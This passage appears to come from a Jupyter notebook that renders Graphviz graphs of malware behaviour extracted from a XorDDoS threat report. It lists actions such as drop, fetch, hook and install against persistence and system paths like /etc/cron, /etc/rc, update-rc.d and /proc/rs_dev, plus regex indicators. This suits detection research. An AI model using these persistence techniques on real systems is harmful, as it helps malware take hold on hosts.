d=\"M1386.6,-102.72C1216.85,-99.52 823.21,-89.87 803.42,-69 768.68,-32.36 853.88,-22.4 913.14,-19.8\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"913.28,-23.29 923.14,-19.41 913.01,-16.3 913.28,-23.29\"/>\n<text text-anchor=\"middle\" x=\"824.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.86,-102.26C1230.13,-98.31 885.94,-87.57 868.42,-69 849.5,-48.93 883.85,-35.43 916.6,-27.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"917.66,-30.92 926.65,-25.31 916.13,-24.09 917.66,-30.92\"/>\n<text text-anchor=\"middle\" x=\"905.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.06,-104.17C1253.34,-103.64 993.74,-98.77 965.42,-69 959.7,-62.98 958.11,-54.49 958.37,-46.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"961.88,-46.35 959.51,-36.02 954.92,-45.57 961.88,-46.35\"/>\n<text text-anchor=\"middle\" x=\"993.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1386.68,-102.08C1283.43,-98.72 1105.7,-90.03 1044.42,-69 1032.88,-65.04 1031.73,-60.53 1021.42,-54 1013.28,-48.85 1004.43,-43.36 996.18,-38.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"997.89,-35.23 987.53,-32.99 994.23,-41.2 997.89,-35.23\"/>\n<text text-anchor=\"middle\" x=\"1069.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1387.06,-101.74C1319.52,-98.36 1218.75,-89.95 1133.42,-69 1115.79,-64.67 1112.67,-59.69 1095.42,-54 1067.2,-44.69 1034.95,-36.05 1009.52,-29.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1010.32,-26.28 999.77,-27.28 1008.64,-33.08 1010.32,-26.28\"/>\n<text text-anchor=\"middle\" x=\"1156.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1252.42\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1252.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1389.29,-99.59C1312.12,-94.23 1200.63,-83.99 1187.42,-69 1175.48,-55.44 1191.35,-43.04 1210.39,-33.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1211.84,-37.17 1219.58,-29.93 1209.02,-30.76 1211.84,-37.17\"/>\n<text text-anchor=\"middle\" x=\"1208.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.pass</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1387.73,-101.31C1334.87,-97.66 1270.8,-89.1 1253.42,-69 1248.07,-62.81 1246.53,-54.41 1246.71,-46.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1250.19,-46.54 1247.7,-36.25 1243.23,-45.85 1250.19,-46.54\"/>\n<text text-anchor=\"middle\" x=\"1278.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.delete</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1410.86,-91.79C1388.99,-85.98 1363.59,-78.26 1341.42,-69 1321.41,-60.64 1300.2,-48.86 1283.51,-38.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1285.09,-35.69 1274.73,-33.46 1281.44,-41.66 1285.09,-35.69\"/>\n<text text-anchor=\"middle\" x=\"1363.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1634.42\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1634.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1420.11,-89.95C1399.56,-81.02 1381.94,-68.44 1394.42,-54 1419.42,-25.1 1529.61,-19.58 1591.63,-18.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1591.91,-22.32 1601.88,-18.74 1591.85,-15.32 1591.91,-22.32\"/>\n<text text-anchor=\"middle\" x=\"1417.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.name</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1458.82,-86.85C1457.06,-76.22 1456.98,-62.94 1464.42,-54 1480.42,-34.77 1547.2,-25.76 1592.14,-21.8\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1592.54,-25.28 1602.22,-20.97 1591.96,-18.31 1592.54,-25.28\"/>\n<text text-anchor=\"middle\" x=\"1487.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.hook</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1485.83,-87.5C1504.34,-73.97 1528.35,-56.62 1533.42,-54 1553.22,-43.77 1576.66,-35.44 1595.98,-29.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1597.09,-32.79 1605.66,-26.57 1595.08,-26.09 1597.09,-32.79\"/>\n<text text-anchor=\"middle\" x=\"1551.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1514.17,-91.34C1532.47,-85.76 1552.92,-78.33 1570.42,-69 1578.54,-64.68 1594.99,-51.78 1609.18,-40.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1611.71,-42.62 1617.2,-33.56 1607.26,-37.22 1611.71,-42.62\"/>\n<text text-anchor=\"middle\" x=\"1621.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.provide</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1519.82,-92.64C1529.68,-90.71 1539.84,-88.77 1549.42,-87 1572.7,-82.7 1639.16,-87.1 1654.42,-69 1660.75,-61.49 1658.52,-51.74 1653.69,-42.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1656.57,-40.84 1648.22,-34.33 1650.69,-44.63 1656.57,-40.84\"/>\n<text text-anchor=\"middle\" x=\"1676.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.call</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1518.83,-92.41C1528.98,-90.47 1539.5,-88.57 1549.42,-87 1582.58,-81.74 1677.14,-94.11 1699.42,-69 1712.51,-54.25 1692.41,-40.82 1671.2,-31.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1672.4,-28.32 1661.82,-27.8 1669.77,-34.8 1672.4,-28.32\"/>\n<text text-anchor=\"middle\" x=\"1729.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1518.32,-92.22C1528.62,-90.27 1539.33,-88.43 1549.42,-87 1572.61,-83.72 1743.59,-86.25 1759.42,-69 1786.24,-39.79 1722.6,-27.33 1676.63,-22.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1676.85,-18.76 1666.55,-21.23 1676.14,-25.72 1676.85,-18.76\"/>\n<text text-anchor=\"middle\" x=\"1795.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.contain</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1517.84,-92.13C1528.28,-90.17 1539.16,-88.34 1549.42,-87 1580.23,-82.98 1807.18,-91.66 1828.42,-69 1832.98,-64.14 1832.7,-59.12 1828.42,-54 1809.53,-31.4 1728.33,-23.37 1677.15,-20.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1677.2,-17.03 1667.04,-20.02 1676.85,-24.02 1677.2,-17.03\"/>\n<text text-anchor=\"middle\" x=\"1853.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.have</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2138.42\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2138.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1517.83,-92.05C1528.27,-90.09 1539.15,-88.29 1549.42,-87 1695.16,-68.71 1733.64,-86.96 1879.42,-69 1884.96,-68.32 2032.32,-39.67 2102.25,-26.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2103.23,-29.42 2112.37,-24.08 2101.89,-22.55 2103.23,-29.42\"/>\n<text text-anchor=\"middle\" x=\"1973.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.read</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1517.35,-92.01C1527.94,-90.04 1538.99,-88.23 1549.42,-87 1648.59,-75.28 1902.74,-97.58 1998.42,-69 2010.84,-65.29 2011.58,-59.26 2023.42,-54 2049.34,-42.49 2080.15,-33.34 2103.35,-27.28\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2104.28,-30.66 2113.11,-24.8 2102.55,-23.87 2104.28,-30.66\"/>\n<text text-anchor=\"middle\" x=\"2045.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1517.35,-91.97C1527.93,-89.99 1538.99,-88.2 1549.42,-87 1606.74,-80.38 2013.79,-87.56 2068.42,-69 2071.01,-68.12 2093.58,-51.86 2112.4,-38.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2114.7,-40.78 2120.7,-32.05 2110.56,-35.13 2114.7,-40.78\"/>\n<text text-anchor=\"middle\" x=\"2126.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1517.34,-91.92C1527.93,-89.95 1538.99,-88.18 1549.42,-87 1583.44,-83.17 2141.57,-93.56 2165.42,-69 2173.26,-60.93 2168.76,-50.12 2161.35,-40.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2163.89,-38.22 2154.65,-33.04 2158.65,-42.85 2163.89,-38.22\"/>\n<text text-anchor=\"middle\" x=\"2198.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.88,-91.98C1527.61,-89.98 1538.83,-88.18 1549.42,-87 1587.04,-82.82 2204.02,-96.11 2230.42,-69 2251,-47.87 2208.56,-33.45 2174.7,-25.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2175.06,-22.21 2164.55,-23.52 2173.59,-29.05 2175.06,-22.21\"/>\n<text text-anchor=\"middle\" x=\"2261.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.88,-91.97C1527.6,-89.97 1538.83,-88.17 1549.42,-87 1569.92,-84.74 2277.02,-83.75 2291.42,-69 2327.36,-32.18 2232.45,-22.46 2176.32,-19.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2176.13,-16.39 2166,-19.49 2175.85,-23.39 2176.13,-16.39\"/>\n<text text-anchor=\"middle\" x=\"2322.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2439.42\" cy=\"-18\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2439.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.88,-91.95C1527.6,-89.95 1538.83,-88.16 1549.42,-87 1637.81,-77.34 2263.61,-92.27 2349.42,-69 2370.67,-63.24 2392.31,-51.44 2409.05,-40.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2411.38,-43.41 2417.8,-34.98 2407.53,-37.56 2411.38,-43.41\"/>\n<text text-anchor=\"middle\" x=\"2404.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.93C1527.6,-89.94 1538.83,-88.15 1549.42,-87 1573.67,-84.37 2408.42,-84.3 2427.42,-69 2434.24,-63.51 2437.6,-54.88 2439.14,-46.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2442.65,-46.47 2440.24,-36.15 2435.69,-45.72 2442.65,-46.47\"/>\n<text text-anchor=\"middle\" x=\"2458.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.have</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2607.42\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2607.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.92C1527.6,-89.93 1538.83,-88.14 1549.42,-87 1652.73,-75.88 2382.64,-89.92 2484.42,-69 2514.52,-62.81 2546.63,-49.51 2570.49,-38.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2572.06,-41.31 2579.53,-33.8 2569,-35.01 2572.06,-41.31\"/>\n<text text-anchor=\"middle\" x=\"2557.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.91C1527.6,-89.91 1538.83,-88.13 1549.42,-87 1578.04,-83.95 2561.46,-84.94 2585.42,-69 2593.34,-63.73 2598.43,-54.92 2601.69,-46.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2605.08,-47.04 2604.66,-36.46 2598.39,-45 2605.08,-47.04\"/>\n<text text-anchor=\"middle\" x=\"2629.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.9C1527.6,-89.9 1538.83,-88.12 1549.42,-87 1580.25,-83.73 2643.68,-91.1 2665.42,-69 2676.36,-57.89 2665.1,-46.46 2649.69,-37.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2651.27,-34.22 2640.82,-32.53 2647.94,-40.37 2651.27,-34.22\"/>\n<text text-anchor=\"middle\" x=\"2689.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2779.42\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2779.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.89C1527.6,-89.9 1538.83,-88.12 1549.42,-87 1613.74,-80.2 2652.28,-90.07 2713.42,-69 2729.21,-63.56 2744.27,-52.76 2756,-42.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2758.51,-45.03 2763.56,-35.71 2753.8,-39.85 2758.51,-45.03\"/>\n<text text-anchor=\"middle\" x=\"2764.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.88C1527.6,-89.89 1538.83,-88.11 1549.42,-87 1583.74,-83.39 2767.2,-93.57 2791.42,-69 2797.61,-62.72 2797.24,-53.84 2794.44,-45.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2797.61,-43.8 2790.48,-35.96 2791.16,-46.53 2797.61,-43.8\"/>\n<text text-anchor=\"middle\" x=\"2832.92\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.download</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2920.42\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2920.42\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1516.87,-91.88C1527.6,-89.88 1538.83,-88.11 1549.42,-87 1622.58,-79.34 2806.1,-98.66 2873.42,-69 2885.86,-63.52 2896.54,-53 2904.57,-43.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2907.47,-44.98 2910.66,-34.88 2901.87,-40.78 2907.47,-44.98\"/>\n<text text-anchor=\"middle\" x=\"2914.42\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.find</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1608.42\" cy=\"-105\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1608.42\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">mem_addr</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1710.42\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1710.42\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1814.42\" cy=\"-105\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1814.42\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3970>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"494pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 494.44 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 490.44,-127 490.44,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"162.95\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"162.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"40.95\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"40.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M130.69,-88.47C119.96,-82.83 108.16,-76.09 97.95,-69 86.34,-60.94 74.45,-50.85 64.55,-41.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"66.8,-39.16 57.09,-34.93 62.04,-44.29 66.8,-39.16\"/>\n<text text-anchor=\"middle\" x=\"115.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"126.95\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"126.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M151.59,-87.01C148.18,-81.43 144.64,-75.09 141.95,-69 138.72,-61.7 135.94,-53.52 133.68,-45.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"136.99,-44.73 130.93,-36.04 130.25,-46.61 136.99,-44.73\"/>\n<text text-anchor=\"middle\" x=\"159.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"198.95\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"198.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M170.23,-86.8C175.32,-74.78 182.21,-58.51 187.97,-44.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"191.24,-46.17 191.92,-35.6 184.79,-43.44 191.24,-46.17\"/>\n<text text-anchor=\"middle\" x=\"201.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"286.95\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"286.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M191.82,-88.21C201.85,-82.45 213.06,-75.7 222.95,-69 235.81,-60.28 249.47,-49.8 260.84,-40.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"263.11,-43.36 268.68,-34.34 258.71,-37.91 263.11,-43.36\"/>\n<text text-anchor=\"middle\" x=\"260.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"291.95\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"291.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"414.95\" cy=\"-105\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"414.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3940>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"338pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 338.30 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 334.3,-127 334.3,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"166.3\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text 